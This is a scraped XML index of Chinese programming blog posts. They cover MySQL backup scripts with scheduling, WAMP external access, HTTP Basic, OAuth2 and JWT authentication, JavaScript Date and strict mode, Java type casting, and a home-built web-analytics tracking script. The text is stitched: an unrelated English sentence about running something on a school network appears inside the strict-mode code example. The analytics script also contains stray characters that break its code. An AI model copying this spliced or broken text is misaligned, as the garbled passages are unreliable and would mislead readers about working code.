    <content type="text"><![CDATA[核心命令：path/mysqldump –opt -u数据库账号 -p数据库密码 &gt; 备份文件名 Linux备份脚本 ( mysql_back.sh)： 12345678910111213141516171819202122232425262728293031#!/bin/sh# File: /root/mysql_dump/mysql_back.sh#tabase infoDB_NAME="数据库名字"DB_USER="数据库用户"DB_PASS="数据库密码"# Others vars# whereis mysqldump# IS ` but not 'BIN_DIR="/usr/local/mysql/bin" # mysql 安装bin目录BCK_DIR="/root/mysql_dump/data" # 备份目录DATE=`date +%Y%m%d_%H%M%S` # 生成一个时间戳# TODOmkdir -p $BCK_DIR # 如果备份目录不存在则创建一个备份目录# 备份命令$BIN_DIR/mysqldump --opt -u$DB_USER -p$DB_PASS $DB_NAME &gt; $BCK_DIR/$DB_NAME.dump_$DATE.sql 定时执行脚本： 例如; 每天晚上0点执行 在终端下执行 crontab -e（需要root权限），进入vi编辑窗口，添加一行： 0 0 * * * /root/mysql_dump/mysql_back.sh Window备份脚本(mysql_back.bat) ： 1234567891011121314151617181920212223242526272829303132333435@echo off:: !/bin/bat:: File: /root/mysql_dump/mysql_back.bat:: tabase infoset DB_NAME=com_cmsset DB_USER=rootset DB_PASS=root:: Others vars:: mysql 安装目录下的binset BIN_DIR=d:/wamp/bin/mysql/mysql5.7.14/bin:: 备份目录set BCK_DIR=d:/backup:: 生成一个时间戳set DATE=%date:~0,4%%date:~5,2%%date:~8,2%%time:~0,2%%time:~3,2%%time:~6,2%:: TODO 如果备份目录不存在则创建一个备份目录IF NOT EXIST %BCK_DIR% MD %BCK_DIR%:: 备份命令%BIN_DIR%/mysqldump --opt -u%DB_USER% -p%DB_PASS% %DB_NAME% &gt; %BCK_DIR%/%DB_NAME%.dump_%DATE%.sql 定时执行脚本： 12345schtasks /create /tn "任务名字" /tr d:/backup/mysql_back.bat /sc daily /st 00:00 /ed 31/12/2017Set ws = CreateObject("Wscript.Shell")ws.run "d:/backup/mysql_back",vbhide]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Wamp3.0以上版本实现外网访问]]></title>
    <url>%2Farticles%2FWamp3-0%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E5%AE%9E%E7%8E%B0%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[1、http-vhost.conf : Require all granted 允许所有请求 , 突破403限制 2、防火墙入口规则添加 80端口 允许访问]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[几种常用的认证机制]]></title>
    <url>%2Farticles%2F%E5%87%A0%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[最近想做个小程序，需要用到授权认证流程。以前项目都是用的 OAuth2 认证，但是Sanic 使用OAuth2 不太方便，就想试一下 JWT 的认证方式。这一篇主要内容是 JWT 的认证原理，以及python 使用 jwt 认识的实践。 几种常用的认证机制 HTTP Basic AuthHTTP Basic Auth 在HTTP中，基本认证是一种用来允许Web浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式，通常用户名和明码会通过HTTP头传递。 在发送之前是以用户名追加一个冒号然后串接上口令，并将得出的结果字符串再用Base64算法编码。例如，提供的用户名是Aladdin、口令是open sesame，则拼接后的结果就是Aladdin:open sesame，然后再将其用Base64编码，得到QWxhZGRpbjpvcGVuIHNlc2FtZQ==。最终将Base64编码的字符串发送出去，由接收者解码得到一个由冒号分隔的用户名和口令的字符串。 优点 基本认证的一个优点是基本上所有流行的网页浏览器都支持基本认证。 缺点 由于用户名和密码都是Base64编码的，而Base64编码是可逆的，所以用户名和密码可以认为是明文。所以只有在客户端和服务器主机之间的连接是安全可信的前提下才可以使用。 接下来我们看一个更加安全也适用范围更大的认证方式 OAuth。 OAuthOAuth 是一个关于授权（authorization）的开放网络标准。允许用户提供一个令牌，而不是用户名和密码来访问他们存放在特定服务提供者的数据。现在的版本是2.0版。 严格来说，OAuth2不是一个标准协议，而是一个安全的授权框架。它详细描述了系统中不同角色、用户、服务前端应用（比如API），以及客户端（比如网站或移动App）之间怎么实现相互认证。 名词定义 Third-party application: 第三方应用程序，又称”客户端”（client） HTTP service：HTTP服务提供商 Resource Owner：资源所有者，通常称”用户”（user）。 User Agent：用户代理，比如浏览器。 Authorization server：认证服务器，即服务提供商专门用来处理认证的服务器。 Resource server：资源服务器，即服务提供商存放用户生成的资源的服务器。它与认证服务器，可以是同一台服务器，也可以是不同的服务器。 OAuth 2.0 运行流程如图： （A）用户打开客户端以后，客户端要求用户给予授权。 （B）用户同意给予客户端授权。 （C）客户端使用上一步获得的授权，向认证服务器申请令牌。 （D）认证服务器对客户端进行认证以后，确认无误，同意发放令牌。 （E）客户端使用令牌，向资源服务器申请获取资源。 （F）资源服务器确认令牌无误，同意向客户端开放资源。 优点 1234567快速开发实施代码量小维护工作减少如果设计的API要被不同的App使用，并且每个App使用的方式也不一样，使用OAuth2是个不错的选择。 缺点： 1OAuth2是一个安全框架，描述了在各种不同场景下，多个应用之间的授权问题。有海量的资料需要学习，要完全理解需要花费大量时间。 OAuth2不是一个严格的标准协议，因此在实施过程中更容易出错。 了解了以上两种方式后，现在终于到了本篇的重点，JWT 认证。 JWT 认证Json web token (JWT), 根据官网的定义，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 JWT 特点 体积小，因而传输速度快 传输方式多样，可以通过URL/POST参数/HTTP头部等方式传输 严格的结构化。它自身（在 payload 中）就包含了所有与用户相关的验证消息，如用户可访问路由、访问有效期等信息，服务器无需再去连接数据库验证信息的有效性，并且 payload 支持为你的应用而定制化。 支持跨域验证，可以应用于单点登录。 JWT原理 JWT是Auth0提出的通过对JSON进行加密签名来实现授权验证的方案，编码之后的JWT看起来是这样的一串字符： eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ 由 . 分为三段，通过解码可以得到： 头部（Header）// 包括类别（typ）、加密算法（alg）； 1234567&#123; "alg": "HS256", "typ": "JWT"&#125; jwt的头部包含两部分信息： 声明类型，这里是jwt 声明加密的算法 通常直接使用 HMAC SHA256 然后将头部进行base64加密（该加密是可以对称解密的)，构成了第一部分。 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ92. 载荷（payload） 载荷就是存放有效信息的地方。这些有效信息包含三个部分： 公共的声明 ： 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密。 私有的声明 ： 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。 下面是一个例子： 123456789101112131415161718192021// 包括需要传递的用户信息；&#123; "iss": "Online JWT Builder", "iat": 1416797419, "exp": 1448333419, "aud": "www.gusibi.com", "sub": "uid", "nickname": "goodspeed", "username": "goodspeed", "scopes": [ "admin", "user" ]&#125; iss: 该JWT的签发者，是否使用是可选的； sub: 该JWT所面向的用户，是否使用是可选的； aud: 接收该JWT的一方，是否使用是可选的； exp(expires): 什么时候过期，这里是一个Unix时间戳，是否使用是可选的； iat(issued at): 在什么时候签发的(UNIX时间)，是否使用是可选的； 其他还有： nbf (Not Before)：如果当前时间在nbf里的时间之前，则Token不被接受；一般都会留一些余地，比如几分钟；，是否使用是可选的； jti: jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。 将上面的JSON对象进行base64编码可以得到下面的字符串。这个字符串我们将它称作JWT的Payload（载荷）。 eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE0MTY3OTc0MTksImV4cCI6 MTQ0ODMzMzQxOSwiYXVkIjoid3d3Lmd1c2liaS5jb20iLCJzdWIiOiIwMTIzNDU2Nzg5Iiwibmlja25hbWUiOiJnb29kc3BlZWQiLCJ1c2VybmFtZSI6Imdvb2RzcGVlZCIsInNjb3BlcyI6WyJhZG1pbiIsInVzZXIiXX0 信息会暴露：由于这里用的是可逆的base64 编码，所以第二部分的数据实际上是明文的。我们应该避免在这里存放不能公开的隐私信息。 签名（signature）// 根据alg算法与私有秘钥进行加密得到的签名字串；// 这一段是最重要的敏感信息，只能在服务端解密； HMACSHA256( base64UrlEncode(header) + “.” + base64UrlEncode(payload), SECREATE_KEY ) jwt的第三部分是一个签证信息，这个签证信息由三部分组成： header (base64后的) payload (base64后的) secret 将上面的两个编码后的字符串都用句号.连接在一起（头部在前），就形成了: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJKb2huIFd1IEpXVCIsImlhdCI6MTQ0MTU5MzUwMiwiZXhwIjoxNDQxNTk0NzIyLCJhdWQiOiJ3d3cuZXhhbXBsZS5jb20iLCJzdWIiOiJqcm9ja2V0QGV4YW1wbGUuY29tIiwiZnJvbV91c2VyIjoiQiIsInRhcmdldF91c2VyIjoiQSJ9 最后，我们将上面拼接完的字符串用HS256算法进行加密。在加密的时候，我们还需要提供一个密钥（secret）。如果我们用 secret作为密钥的话，那么就可以得到我们加密后的内容: pq5IDv-yaktw6XEa5GEv07SzS9ehe6AcVSdTj0Ini4o 将这三部分用.连接成一个完整的字符串,构成了最终的jwt: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE0MTY3OTc0MTksImV4cCI6MTQ0ODMzMzQxOSwiYXVkIjoid3d3Lmd1c2liaS5jb20iLCJzdWIiOiIwMTIzNDU2Nzg5Iiwibmlja25hbWUiOiJnb29kc3BlZWQiLCJ1c2VybmFtZSI6Imdvb2RzcGVlZCIsInNjb3BlcyI6WyJhZG1pbiIsInVzZXIiXX0.pq5IDv-yaktw6XEa5GEv07SzS9ehe6AcVSdTj0Ini4o 签名的目的：签名实际上是对头部以及载荷内容进行签名。所以，如果有人对头部以及载荷的内容解码之后进行修改，再进行编码的话，那么新的头部和载荷的签名和之前的签名就将是不一样的。而且，如果不知道服务器加密的时候用的密钥的话，得出来的签名也一定会是不一样的。 这样就能保证token不会被篡改。 token 生成好之后，接下来就可以用token来和服务器进行通讯了。 下图是client 使用 JWT 与server 交互过程: 这里在第三步我们得到 JWT 之后，需要将JWT存放在 client，之后的每次需要认证的请求都要把JWT发送过来。（请求时可以放到 header 的 Authorization ） JWT 使用场景 JWT的主要优势在于使用无状态、可扩展的方式处理应用中的用户会话。服务端可以通过内嵌的声明信息，很容易地获取用户的会话信息，而不需要去访问用户或会话的数据库。在一个分布式的面向服务的框架中，这一点非常有用。 但是，如果系统中需要使用黑名单实现长期有效的token刷新机制，这种无状态的优势就不明显了。 优点 123456789快速开发不需要cookieJSON在移动端的广泛应用不依赖于社交登录相对简单的概念理解 缺点 12345Token有长度限制Token不能撤销需要token有失效时间限制(exp)]]></content>
  </entry>
  <entry>
    <title><![CDATA[var s=+newDate();]]></title>
    <url>%2Farticles%2Fvar%20s-newDate-%2F</url>
    <content type="text"><![CDATA[解释如下: =+是不存在的; +new Date()是一个东西; + 相当于.valueOf(); 下面4个结果一样，都返回当前时间的毫秒数 1234567alert(+new Date());// 1564712654001alert(+new Date); // 1564712654001var s=new Date(); // 1564712654001alert(s.valueOf());// 1564712654001alert(s.getTime());// 1564712654001 获取当前时间 12var myDate = new Date();var a=myDate.toLocaleString(); // 2011-11-07 18:13:56 顺便说下valueOf的另一个用法: valueOf() 方法可返回 Boolean 对象的原始值。 如果调用该方法的对象不是 Boolean，则抛出异常 TypeError。 123var boo = new Boolean(false);console.log(boo.valueOf()); // falseconsole.log(typeof(boo.valueOf())); // boolean]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Javascript 严格模式详解]]></title>
    <url>%2Farticles%2FJavascript%20%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[一、概述除了正常运行模式，ECMAscript 5添加了第二种运行模式：“严格模式”（strict mode）。顾名思义，这种模式使得Javascript在更严格的条件下运行。 设立”严格模式”的目的，主要有以下几个： 消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为; 消除代码运行的一些不安全之处，保证代码运行的安全； 提高编译器效率，增加运行速度； 为未来新版本的Javascript做好铺垫。 “严格模式”体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。 另一方面，同样的代码，在”严格模式”中，可能会有不一样的运行结果；一些在”正常模式”下可以运行的语句，在”严格模式”下将不能运行。掌握这些内容，有助于更细致深入地理解Javascript，让你变成一个更好的程序员。 本文将对”严格模式”做详细介绍。 二、进入标志进入”严格模式”的标志，是下面这行语句： 1"use strict"; 老版本的浏览器会把它当作一行普通字符串，加以忽略。 三、如何调用“严格模式”有两种调用方法，适用于不同的场合。 3.1 针对整个脚本文件将”use strict”放在脚本文件的第一行，则整个脚本都将以”严格模式”运行。如果这行语句不在第一行，则无效，整个脚本以”正常模式”运行。如果不同模式的代码文件合并成一个文件，这一点需要特别注意。 (严格地说，只要前面不是产生实际运行结果的语句，”use strict”可以不在第一行，比如直接跟在一个空的分号后面。) 12"use strict";console.log("这是严格模式。"); 1console.log("这是正常模式。");kly, it's almost 2 years ago now. I can admit it now - I run it on my school's network that has about 50 computers. 上面的代码表示，一个网页中依次有两段Javascript代码。前一个script标签是严格模式，后一个不是。 3.2 针对单个函数将”use strict”放在函数体的第一行，则整个函数以”严格模式”运行。 12345678function strict()&#123; "use strict"; return "这是严格模式。";&#125;function notStrict() &#123; return "这是正常模式。";&#125; 3.3 脚本文件的变通写法因为第一种调用方法不利于文件合并，所以更好的做法是，借用第二种方法，将整个脚本文件放在一个立即执行的匿名函数之中。 1234567(function ()&#123; "use strict"; // some code here&#125;)(); 四、语法和行为改变严格模式对Javascript的语法和行为，都做了一些改变。 4.1 全局变量显式声明在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。 1234567"use strict";v = 1; // 报错，v未声明for(i = 0; i &lt; 2; i++) &#123; // 报错，i未声明&#125; 因此，严格模式下，变量都必须先用var命令声明，然后再使用。 4.2 静态绑定Javascript语言的一个特点，就是允许”动态绑定”，即某些属性和方法到底属于哪一个对象，不是在编译时确定的，而是在运行时（runtime）确定的。 严格模式对动态绑定做了一些限制。某些情况下，只允许静态绑定。也就是说，属性和方法到底归属哪个对象，在编译阶段就确定。这样做有利于编译效率的提高，也使得代码更容易阅读，更少出现意外。 具体来说，涉及以下几个方面。 （1）禁止使用with语句 因为with语句无法在编译时就确定，属性到底归属哪个对象。 1234567"use strict";var v = 1;with (o)&#123; // 语法错误 v = 2;&#125; （2）创设eval作用域 正常模式下，Javascript语言有两种变量作用域（scope）：全局作用域和函数作用域。严格模式创设了第三种作用域：eval作用域。 正常模式下，eval语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于eval内部。 12345678"use strict";var x = 2;console.info(eval("var x = 5; x")); // 5console.info(x); // 2 4.3 增强的安全措施（1）禁止this关键字指向全局对象 12345678910111213function f()&#123; return !this;&#125;// 返回false，因为"this"指向全局对象，"!this"就是falsefunction f()&#123; "use strict"; return !this;&#125; // 返回true，因为严格模式下，this的值为undefined，所以”!this”为true。 因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错。 12345678function f()&#123; "use strict"; this.a = 1;&#125;;f();// 报错，this未定义 （2）禁止在函数内部遍历调用栈 12345678910function f1()&#123; "use strict"; f1.caller; // 报错 f1.arguments; // 报错&#125;f1(); 4.4 禁止删除变量严格模式下无法删除变量。只有configurable设置为true的对象属性，才能被删除。 123456789101112131415"use strict";var x;delete x; // 语法错误var o = Object.create(null, &#123;'x': &#123; value: 1, configurable: true&#125;&#125;);delete o.x; // 删除成功 4.5 显式报错正常模式下，对一个对象的只读属性进行赋值，不会报错，只会默默地失败。严格模式下，将报错。 1234567"use strict";var o = &#123;&#125;;Object.defineProperty(o, "v", &#123; value: 1, writable: false &#125;);o.v = 2; // 报错 严格模式下，对一个使用getter方法读取的属性进行赋值，会报错。 123456789"use strict";var o = &#123;get v() &#123; return 1; &#125;&#125;;o.v = 2; // 报错 严格模式下，对禁止扩展的对象添加新属性，会报错。 1234567"use strict";var o = &#123;&#125;;Object.preventExtensions(o);o.v = 1; // 报错 严格模式下，删除一个不可删除的属性，会报错。 123"use strict";delete Object.prototype; // 报错 4.6 重名错误严格模式新增了一些语法错误。 （1）对象不能有重名的属性 正常模式下，如果对象有多个重名属性，最后赋值的那个属性会覆盖前面的值。严格模式下，这属于语法错误。 123456789"use strict";var o = &#123; p: 1, p: 2&#125;; // 语法错误 （2）函数不能有重名的参数 正常模式下，如果函数有多个重名的参数，可以用arguments[i]读取。严格模式下，这属于语法错误。 123456"use strict";function f(a, a, b) &#123; // 语法错误 return ;&#125; 4.7 禁止八进制表示法正常模式下，整数的第一位如果是0，表示这是八进制数，比如0100等于十进制的64。严格模式禁止这种表示法，整数第一位为0，将报错。 123"use strict";var n = 0100; // 语法错误 4.8 arguments对象的限制arguments是函数的参数对象，严格模式对它的使用做了限制。 （1）不允许对arguments赋值 1234567891011"use strict";arguments++; // 语法错误var obj = &#123; set p(arguments) &#123; &#125; &#125;; // 语法错误try &#123; &#125; catch (arguments) &#123; &#125; // 语法错误function arguments() &#123; &#125; // 语法错误var f = new Function("arguments", "'use strict'; return 17;"); // 语法错误 （2）arguments不再追踪参数的变化 1234567891011121314151617181920function f(a) &#123; a = 2; return [a, arguments[0]];&#125;f(1); // 正常模式为[2,2]function f(a) &#123;"use strict";a = 2;return [a, arguments[0]];&#125;f(1); // 严格模式为[2,1] （3）禁止使用arguments.callee 这意味着，你无法在匿名函数内部调用自身了。 12345"use strict";var f = function() &#123; return arguments.callee; &#125;;f(); // 报错 4.9 函数必须声明在顶层将来Javascript的新版本会引入”块级作用域”。为了与新版本接轨，严格模式只允许在全局作用域或函数作用域的顶层声明函数。也就是说，不允许在非函数的代码块内声明函数。 1234567891011"use strict";if (true) &#123; function f() &#123; &#125; // 语法错误&#125;for (var i = 0; i &lt; 5; i++) &#123; function f2() &#123; &#125; // 语法错误&#125; 4.10 保留字为了向将来Javascript的新版本过渡，严格模式新增了一些保留字：implements, interface, let, package, private, protected, public, static, yield。 使用这些词作为变量名将会报错。 123456function package(protected) &#123; // 语法错误 "use strict"; var implements; // 语法错误&#125; 此外，ECMAscript第五版本身还规定了另一些保留字（class, enum, export, extends, import, super），以及各大浏览器自行增加的const保留字，也是不能作为变量名的。 五、参考链接 MDN,Strict mode Dr. Axel Rauschmayer，JavaScript’s strict mode: a summary]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Java上转型和下转型]]></title>
    <url>%2Farticles%2FJava%E4%B8%8A%E8%BD%AC%E5%9E%8B%E5%92%8C%E4%B8%8B%E8%BD%AC%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[Java 转型问题其实并不复杂，只要记住一句话：父类引用指向子类对象。 什么叫父类引用指向子类对象，且听我慢慢道来. 从2个名词开始说起：向上转型(upcasting) 、向下转型(downcasting). 举个例子：有2个类，Father是父类，Son类继承自Father。 1234567Father f1 = new Son(); // 这就叫 upcasting （向上转型)// 现在f1引用指向一个Son对象Son s1 = (Son)f1; // 这就叫 downcasting (向下转型)// 现在f1还是指向Son对象 第2个例子： 123Father f2 = new Father();Son s2 = (Son)f2; // 出错，子类引用不能指向父类对象 你或许会问，第1个例子中：Son s1 = (Son)f1; 为什么是正确的呢？ 很简单因为f1指向一个子类对象，Father f1 = new Son(); 子类s1引用当然可以指向子类对象了。 而f2 被传给了一个Father对象，Father f2 = new Father()；子类s1引用不能指向父类对象。 总结： 1。父类引用指向子类对象，而子类引用不能指向父类对象。 2。把子类对象直接赋给父类引用叫upcasting向上转型，向上转型不用强制转换。 如：Father f1 = new Son(); 3。把指向子类对象的父类引用赋给子类引用叫向下转型(downcasting)，要强制转换。 如：f1 就是一个指向子类对象的父类引用。把f1赋给子类引用s1即 Son s1 = (Son)f1； 其中f1前面的(Son)必须加上，进行强制转换。]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网站统计中的数据收集原理及实现]]></title>
    <url>%2Farticles%2F%E7%BD%91%E7%AB%99%E7%BB%9F%E8%AE%A1%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[网站数据统计分析工具是网站站长和运营人员经常使用的一种工具，比较常用的有谷歌分析、百度统计和腾讯分析等等。所有这些统计分析工具的第一步都是网站访问数据的收集。目前主流的数据收集方式基本都是基于javascript的。本文将简要分析这种数据收集的原理，并一步一步实际搭建一个实际的数据收集系统。 原理分析简单来说，网站统计分析工具需要收集到用户浏览目标网站的行为（如打开某网页、点击某按钮、将商品加入购物车等）及行为附加数据（如某下单行为产生的订单金额等）。早期的网站统计往往只收集一种用户行为：页面的打开。而后用户在页面中的行为均无法收集。这种收集策略能满足基本的流量分析、来源分析、内容分析及访客属性等常用分析视角，但是，随着ajax技术的广泛使用及电子商务网站对于电子商务目标的统计分析的需求越来越强烈，这种传统的收集策略已经显得力不能及。 后来，Google在其产品谷歌分析中创新性的引入了可定制的数据收集脚本，用户通过谷歌分析定义好的可扩展接口，只需编写少量的javascript代码就可以实现自定义事件和自定义指标的跟踪和分析。目前百度统计、搜狗分析等产品均照搬了谷歌分析的模式。 其实说起来两种数据收集模式的基本原理和流程是一致的，只是后一种通过javascript收集到了更多的信息。下面看一下现在各种网站统计工具的数据收集基本原理。 流程概览首先通过一幅图总体看一下数据收集的基本流程。 首先，用户的行为会触发浏览器对被统计页面的一个http请求，这里姑且先认为行为就是打开网页。当网页被打开，页面中的埋点javascript片段会被执行，用过相关工具的朋友应该知道，一般网站统计工具都会要求用户在网页中加入一小段javascript代码，这个代码片段一般会动态创建一个script标签，并将src指向一个单独的js文件，此时这个单独的js文件（图1中绿色节点）会被浏览器请求到并执行，这个js往往就是真正的数据收集脚本。数据收集完成后，js会请求一个后端的数据收集脚本（图1中的backend），这个脚本一般是一个伪装成图片的动态脚本程序，可能由php、python或其它服务端语言编写，js会将收集到的数据通过http参数的方式传递给后端脚本，后端脚本解析参数并按固定格式记录到访问日志，同时可能会在http响应中给客户端种植一些用于追踪的cookie。 上面是一个数据收集的大概流程，下面以谷歌分析为例，对每一个阶段进行一个相对详细的分析。 埋点脚本执行阶段若要使用谷歌分析（以下简称GA），需要在页面中插入一段它提供的javascript片段，这个片段往往被称为埋点代码。下面是我的博客中所放置的谷歌分析埋点代码截图： 其中_gaq是GA的的全局数组，用于放置各种配置，其中每一条配置的格式为： 1_gaq.push(['Action', 'param1', 'param2', ...]); Action指定配置动作，后面是相关的参数列表。GA给的默认埋点代码会给出两条预置配置，_setAccount用于设置网站标识ID，这个标识ID是在注册GA时分配的。_trackPageview告诉GA跟踪一次页面访问。更多配置请参考：https://developers.google.com/analytics/devguides/collection/gajs/。实际上，这个_gaq是被当做一个FIFO队列来用的，配置代码不必出现在埋点代码之前，具体请参考上述链接的说明。 就本文来说，_gaq的机制不是重点，重点是后面匿名函数的代码，这才是埋点代码真正要做的。这段代码的主要目的就是引入一个外部的js文件（ga.js），方式是通过document.createElement方法创建一个script并根据协议（http或https）将src指向对应的ga.js，最后将这个element插入页面的dom树上。 注意ga.async = true的意思是异步调用外部js文件，即不阻塞浏览器的解析，待外部js下载完成后异步执行。这个属性是HTML5新引入的。 数据收集脚本执行阶段数据收集脚本（ga.js）被请求后会被执行，这个脚本一般要做如下几件事： 通过浏览器内置javascript对象收集信息，如页面title（通过document.title）、referrer（上一跳url，通过document.referrer）、用户显示器分辨率（通过windows.screen）、cookie信息（通过document.cookie）等等一些信息。 解析_gaq收集配置信息。这里面可能会包括用户自定义的事件跟踪、业务数据（如电子商务网站的商品编号等）等。 上面两步收集的数据按预定义格式解析并拼接。 请求一个后端脚本，将信息放在http request参数中携带给后端脚本。 这里唯一的问题是步骤4，javascript请求后端脚本常用的方法是ajax，但是ajax是不能跨域请求的。这里ga.js在被统计网站的域内执行，而后端脚本在另外的域（GA的后端统计脚本是http://www.google-analytics.com/__utm.gif，ajax行不通。一种通用的方法是js脚本创建一个Image对象，将Image对象的src属性指向后端脚本并携带参数，此时即实现了跨域请求后端。这也是后端脚本为什么通常伪装成gif文件的原因。通过http抓包可以看到ga.js对__utm.gif的请求： 可以看到ga.js在请求__utm.gif时带了很多信息，例如utmsr=1280×1024是屏幕分辨率，utmac=UA-35712773-1是_gaq中解析出的我的GA标识ID等等。 值得注意的是，__utm.gif未必只会在埋点代码执行时被请求，如果用_trackEvent配置了事件跟踪，则在事件发生时也会请求这个脚本。 由于ga.js经过了压缩和混淆，可读性很差，我们就不分析了，具体后面实现阶段我会实现一个功能类似的脚本。 后端脚本执行阶段 GA的__utm.gif是一个伪装成gif的脚本。这种后端脚本一般要完成以下几件事情： 解析http请求参数的到信息。 从服务器（WebServer）中获取一些客户端无法获取的信息，如访客ip等。 将信息按格式写入log。 生成一副1×1的空gif图片作为响应内容并将响应头的Content-type设为image/gif。 在响应头中通过Set-cookie设置一些需要的cookie信息。 之所以要设置cookie是因为如果要跟踪唯一访客，通常做法是如果在请求时发现客户端没有指定的跟踪cookie，则根据规则生成一个全局唯一的cookie并种植给用户，否则Set-cookie中放置获取到的跟踪cookie以保持同一用户cookie不变（见图4）。 这种做法虽然不是完美的（例如用户清掉cookie或更换浏览器会被认为是两个用户），但是是目前被广泛使用的手段。注意，如果没有跨站跟踪同一用户的需求，可以通过js将cookie种植在被统计站点的域下（GA是这么做的），如果要全网统一定位，则通过后端脚本种植在服务端域下（我们待会的实现会这么做）。 系统的设计实现根据上述原理，我自己搭建了一个访问日志收集系统。总体来说，搭建这个系统要做如下的事： 下面详述每一步的实现。我将这个系统叫做MyAnalytics。 确定收集的信息为了简单起见，我不打算实现GA的完整数据收集模型，而是收集以下信息。 名称 途径 备注 访问时间 web server Nginx $msec IP web server Nginx $remote_addr 域名 javascript document.domain URL javascript document.URL 页面标题 javascript document.title 分辨率 javascript window.screen.height &amp; width 颜色深度 javascript window.screen.colorDepth Referrer javascript document.referrer 浏览客户端 web server Nginx $http_user_agent 客户端语言 javascript navigator.language 访客标识 cookie 网站标识 javascript 自定义对象 埋点代码埋点代码我将借鉴GA的模式，但是目前不会将配置对象作为一个FIFO队列用。一个埋点代码的模板如下： 1234567891011121314151617181920&lt;script type="text/javascript"&gt;var _maq = _maq || [];_maq.push(['_setAccount', '网站标识']);(function() &#123; var ma = document.createElement('script'); ma.type = 'text/javascript'; ma.async = true; ma.src = ('https:' == document.location.protocol ? 'https://analytics':'http://analytics)') + '.codinglabs.org/ma.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ma, s);&#125;)();&lt;/script&gt; 这里我启用了二级域名analytics.codinglabs.org，统计脚本的名称为ma.js。当然这里有一点小问题，因为我并没有https的服务器，所以如果一个https站点部署了代码会有问题，不过这里我们先忽略吧。 前端统计脚本我写了一个不是很完善但能完成基本工作的统计脚本ma.js： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576(function() &#123; var params = &#123;&#125;; //Document对象数据 if (document) &#123; params.domain = document.domain || ''; params.url = document.URL || ''; params.title = document.title || ''; params.referrer = document.referrer || ''; &#125; //Window对象数据 if (window &amp;&amp; window.screen) &#123; params.sh = window.screen.height || 0; params.sw = window.screen.width || 0; params.cd = window.screen.colorDepth || 0; &#125; //navigator对象数据 if (navigator) &#123; params.lang = navigator.language || ''; &#125; //解析_maq配置 if (_maq) &#123; for (var i in _maq) &#123; switch (_maq[i][0]) &#123; case '_setAccount': params.account = _maq[i][1]; break; default: break; &#125; &#125; &#125; //拼接参数串 var args = ''; for (var i in params) &#123; if (args != '') &#123; args += '&amp;'; &#125; args += i + '=' + encodeURIComponent(params[i]); &#125; //通过Image对象请求后端脚本 var img = new Image(1, 1); img.src = 'http://analytics.codinglabs.org/1.gif?' + args;&#125;)();' 整个脚本放在匿名函数里，确保不会污染全局环境。功能在原理一节已经说明，不再赘述。其中1.gif是后端脚本。 日志格式日志采用每行一条记录的方式，采用不可见字符^A（ascii码0×01，Linux下可通过ctrl + v ctrl + a输入，下文均用“^A”表示不可见字符0×01），具体格式如下： 时间^AIP^A域名^AURL^A页面标题^AReferrer^A分辨率高^A分辨率宽^A颜色深度^A语言^A客户端信息^A用户标识^A网站标识 